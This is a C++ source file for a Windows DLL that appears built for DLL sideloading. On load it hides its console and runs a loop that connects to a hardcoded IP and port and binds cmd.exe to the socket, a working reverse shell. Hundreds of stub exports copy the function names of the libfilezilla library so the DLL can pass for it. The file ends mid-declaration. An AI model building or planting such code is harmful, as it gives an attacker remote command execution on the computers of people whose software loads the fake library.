// dllmain.cpp : Define el punto de entrada de la aplicación DLL.
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "pch.h"
#include <process.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <string>
#include <tchar.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void rs(char* C2Server, int C2Port) {
    while(true) {
        Sleep(5000);    // Five Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  
        addr.sin_port = htons(C2Port);    

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                //char Process[] = "cmd.exe";
                //LPWSTR Process = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL,(LPSTARTUPINFO) &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}


//extern "C" __declspec(dllexport)
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

    char host[] = "192.168.1.119";  //change this
    int port = 8089;                //change this
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        FreeConsole();
        rs(host, port);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void GenerateFingerprint(const char* parent_function_name)
{

}


extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10async_task4joinEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10async_task6detachEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10async_taskC1EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10async_taskC2EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10async_taskD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10async_taskD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10async_taskaSEOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10create_jwkEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop10send_eventEPNS_13event_handlerEPNS_10event_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop10stop_timerEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop13filter_eventsERKSt8functionIFbRSt4pairIPNS_13event_handlerEPNS_10event_baseEEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop13process_eventERNS_11scoped_lockE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop14process_timersERNS_11scoped_lockERNS_15monotonic_clockE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop14remove_handlerEPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop3runEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop4stopEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop5entryEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loop9add_timerEPNS_13event_handlerERKNS_8durationEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopC1ENS0_11loop_optionE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopC1ERNS_11thread_poolE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopC1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopC2ENS0_11loop_optionE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopC2ERNS_11thread_poolE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopC2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10event_loopD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10public_key11from_base64ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10public_key11from_base64ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10remove_dirERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10to_wstringB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz10to_wstringB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11bucket_base13remove_bucketEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11bucket_base17set_mgr_recursiveEPNS_18rate_limit_managerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11get_versionB5cxx11Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11hmac_sha256ERKSt17basic_string_viewIcSt11char_traitsIcEERKSt6vectorIhSaIhEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11hmac_sha256ERKSt17basic_string_viewIcSt11char_traitsIcEES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11hmac_sha256ERKSt6vectorIhSaIhEERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11hmac_sha256ERKSt6vectorIhSaIhEES4_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11private_key11from_base64ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11private_key13from_passwordERKSt6vectorIhSaIhEES5_j() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11private_key8generateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11remove_fileERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11rename_fileERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEES7_b() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_base13detach_threadERNS_11scoped_lockE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_base16set_buffer_sizesEii() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_base17address_to_stringB5cxx11EPK8sockaddribb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_base17address_to_stringB5cxx11EPKci() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_base4bindERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_base5closeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_baseC1ERNS_11thread_poolEPNS_13event_handlerEPNS_19socket_event_sourceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11socket_baseC2ERNS_11thread_poolEPNS_13event_handlerEPNS_19socket_event_sourceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11strtok_viewERKSt17basic_string_viewIcSt11char_traitsIcEES5_b() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11strtok_viewERKSt17basic_string_viewIcSt11char_traitsIcEEcb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11strtok_viewERKSt17basic_string_viewIwSt11char_traitsIwEES5_b() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11strtok_viewERKSt17basic_string_viewIwSt11char_traitsIwEEwb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11thread_pool5spawnERKSt8functionIFvvEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11thread_poolC1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11thread_poolC2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11thread_poolD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz11thread_poolD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_string3setERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_string6removeERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_stringC1ERKSt16initializer_listISt4pairINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEES8_EE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_stringC1ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_stringC1ERKSt4pairINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEES7_E() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_stringC2ERKSt16initializer_listISt4pairINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEES8_EE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_stringC2ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_stringC2ERKSt4pairINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEES7_E() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12query_stringixERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12random_bytesEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12random_bytesEyPh() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter10add_tokensENS_9direction4typeEyy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter10set_limitsEyy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter11unlock_treeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter12do_set_limitENS_9direction4typeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter12update_statsERb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter17set_mgr_recursiveEPNS_18rate_limit_managerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter19distribute_overflowENS_9direction4typeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter26gather_unspent_for_removalEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter3addEPNS_11bucket_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter5limitENS_9direction4typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter8pay_debtENS_9direction4typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiter9lock_treeEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiterC1EPNS_18rate_limit_managerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiterC2EPNS_18rate_limit_managerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiterD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiterD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12rate_limiterD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layer13shutdown_readEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layer17set_event_handlerEPNS_13event_handlerENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layer20forward_socket_eventEPNS_19socket_event_sourceENS_17socket_event_flagEi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layer21set_event_passthroughENS_17socket_event_flagE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layer25forward_hostaddress_eventEPNS_19socket_event_sourceERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layerC1EPNS_13event_handlerERNS_16socket_interfaceEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layerC2EPNS_13event_handlerERNS_16socket_interfaceEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz12socket_layerD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base32_decodeERKSt17basic_string_viewIcSt11char_traitsIcEENS_11base32_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base32_decodeERKSt17basic_string_viewIwSt11char_traitsIwEENS_11base32_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base32_encodeB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEENS_11base32_typeEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base32_encodeB5cxx11ERKSt6vectorIhSaIhEENS_11base32_typeEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base64_decodeERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base64_decodeERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base64_encodeB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEENS_11base64_typeEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13base64_encodeB5cxx11ERKSt6vectorIhSaIhEENS_11base64_typeEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handler10stop_timerEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handler14remove_handlerEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handler9add_timerERKNS_8durationEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handlerC1ERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handlerC1ERNS_10event_loopE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handlerC2ERKS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handlerC2ERNS_10event_loopE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handlerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handlerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13event_handlerD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socket11fast_acceptERi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socket17set_event_handlerEPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socket6acceptERiPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socket6listenENS_12address_typeEi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socketC1ERNS_11thread_poolEPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socketC2ERNS_11thread_poolEPNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socketD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socketD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13listen_socketD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys12check_bufferEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys13get_file_infoERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERbPxPNS_8datetimeEPib() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys13get_file_typeERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys13get_next_fileERNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys13get_next_fileERNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERbRNS0_4typeEPxPNS_8datetimeEPi() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys14end_find_filesEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys14path_separatorE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys15get_link_targetERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys16begin_find_filesENSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEbb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys16begin_find_filesEPvbb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys21get_modification_timeERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys21set_modification_timeERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEERKNS_8datetimeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesys8get_sizeERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEPb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesysC1EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesysC2EOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesysD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesysD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13local_filesysaSEOS0_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13random_numberExx() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13symmetric_key11decrypt_keyERKSt6vectorIhSaIhEERKNS_11private_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13symmetric_key11encrypt_keyERKNS_10public_keyE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13symmetric_key11from_base64ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13symmetric_key11from_base64ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13symmetric_key13from_passwordERKSt6vectorIhSaIhEES5_j() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13symmetric_key19encryption_overheadEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13symmetric_key8generateEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13tolower_asciiIwEET_S1_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz13toupper_asciiIwEET_S1_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14percent_decodeERKSt17basic_string_viewIcSt11char_traitsIcEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14percent_decodeERKSt17basic_string_viewIwSt11char_traitsIwEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14percent_encodeB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14percent_encodeB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14thread_invokerC1ERNS_10event_loopE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14thread_invokerC2ERNS_10event_loopE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14thread_invokerD0Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14thread_invokerD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14thread_invokerD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz14thread_invokerclERKNS_10event_baseE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15base32_decode_sB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEENS_11base32_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15base32_decode_sB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEENS_11base32_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15base64_decode_sB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15base64_decode_sB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15bitscan_reverseEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15equal_consttimeERKSt17basic_string_viewIhSt11char_traitsIhEES5_() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15hostname_lookup5resetEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15hostname_lookup6lookupERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEENS_12address_typeE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15hostname_lookupC1ERNS_11thread_poolERNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15hostname_lookupC2ERNS_11thread_poolERNS_13event_handlerE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15hostname_lookupD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15hostname_lookupD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz15set_translatorsEPFNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEEPKcEPFS5_S7_S7_xE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16get_address_typeERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16get_address_typeERKSt17basic_string_viewIwSt11char_traitsIwEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulator6digestEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulator6reinitEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulator6updateEPKhy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulator6updateERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulator6updateERKSt17basic_string_viewIhSt11char_traitsIhEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulator6updateERKSt6vectorIhSaIhEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulatorC1ENS_14hash_algorithmE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulatorC2ENS_14hash_algorithmE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulatorD1Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16hash_accumulatorD2Ev() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16nonowning_buffer3addEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16nonowning_buffer3getEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16nonowning_buffer5resetEv() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16nonowning_buffer6appendEPKhy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16nonowning_buffer6resizeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16nonowning_buffer7consumeEy() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16percent_decode_sB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16percent_decode_sB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16percent_encode_wB5cxx11ERKSt17basic_string_viewIwSt11char_traitsIwEEb() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16recursive_remove15adjust_shfileopER16_SHFILEOPSTRUCTW() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16recursive_remove6removeENSt7__cxx114listINS1_12basic_stringIwSt11char_traitsIwESaIwEEESaIS7_EEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz16recursive_remove6removeERKNSt7__cxx1112basic_stringIwSt11char_traitsIwESaIwEEE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17load_certificatesERKSt17basic_string_viewIcSt11char_traitsIcEEbbPNS_16logger_interfaceE() { return 1; }
extern "C" __declspec(dllexport)
BOOL WINAPI _ZN2fz17normalize_hyphensB5cxx11ERKSt17basic_string_viewIcSt11char_traitsIcEE() { return 1; }
extern "C" __declspec(dllexport)
